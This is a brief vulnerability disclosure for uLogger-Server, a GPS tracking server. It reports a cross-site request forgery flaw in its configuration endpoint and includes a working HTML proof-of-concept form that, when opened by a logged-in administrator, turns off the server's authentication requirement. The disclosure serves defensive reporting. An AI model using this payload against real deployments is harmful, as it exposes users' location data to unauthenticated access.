## Description
uLogger-Server is a featured GPS tracking server that is developed in PHP and Javascript.  
ulogger-server is vulnerable to CSRF which enables an Auth Bypass.  The following POC, if triggered by an administrator, will disable the authentication requirement on the ulogger-server, allowing unauthanticated users access to the application:
## POC
```
<html><form enctype="application/x-www-form-urlencoded" method="POST" action="http://[uLogger-Server]/utils/saveconfig.php"><table>
<tr><td>requireAuth</td><td><input type="text" value="false" name="requireAuth"></td></tr>
</table><input type="submit" value="http://[uLogger-server]/utils/saveconfig.php"></form></html>
```
This code should be saved to something like csrfpoc.html then opened by an admin authenticated user.  This will disable the authentication requirement
